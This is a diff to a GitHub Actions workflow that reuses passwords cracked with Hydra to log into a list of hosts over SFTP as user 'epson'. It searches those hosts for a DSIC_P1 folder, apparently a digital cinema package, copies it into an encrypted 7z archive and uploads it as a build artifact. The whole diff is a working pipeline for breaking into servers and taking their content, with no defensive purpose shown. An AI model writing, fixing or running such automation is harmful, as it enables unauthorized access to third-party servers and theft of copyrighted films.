@@ -35,22 +35,35 @@ jobs:
         id: valid
         run: echo "found=$([ -s valid_ips.txt ] && echo true || echo false)" >> $GITHUB_OUTPUT
 
-      - name: Download DCP if found
+      - name: Download DCP if password cracked
         id: dcp
         if: steps.valid.outputs.found == 'true'
         run: |
           mkdir -p staging
           while read ip; do
-              PASS=$(grep -oP '(?<=password: ).*' hydra_$ip.txt | head -n1)
-              rclone config create relay$ip sftp host=$ip user=epson port=22 pass="$PASS"
-              rclone lsf relay$ip:/ | grep -iq dsic && {
-                rclone copy relay$ip:/DSIC_P1 staging/DSIC_P1 -P --transfers=32
-                7z a -pInfinity2025 -mhe=on DSIC_P1.7z staging/DSIC_P1
-                echo "movie_found=true" >> $GITHUB_OUTPUT
-                break
-              }
-          done < valid_ips.txt
+            # extract clear password (last word of the hydra result line)
+            PASS=$(awk '/password:/ {print $NF}' hydra_$ip.txt | head -n1)
+            [ -z "$PASS" ] && continue   # skip if no password
 
+            # create temporary rclone remote with plain password
+            rclone config create relay$ip sftp \
+                host="$ip" \
+                user="epson" \
+                port="22" \
+                --sftp-password "$PASS" \
+                --config /tmp/rclone.conf
+
+            # test if DSIC folder exists
+            rclone lsf "relay$ip:/" --config /tmp/rclone.conf | grep -iq dsic && {
+              echo "movie_found=true" >> $GITHUB_OUTPUT
+              rclone copy "relay$ip:/DSIC_P1" staging/DSIC_P1 \
+                  --config /tmp/rclone.conf \
+                  --transfers=32 -P
+              7z a -pInfinity2025 -mhe=on DSIC_P1.7z staging/DSIC_P1
+              break
+            }
+          done < valid_ips.txt
+          
       - name: Upload artifact
         if: steps.dcp.outputs.movie_found == 'true'
         uses: actions/upload-artifact@v4
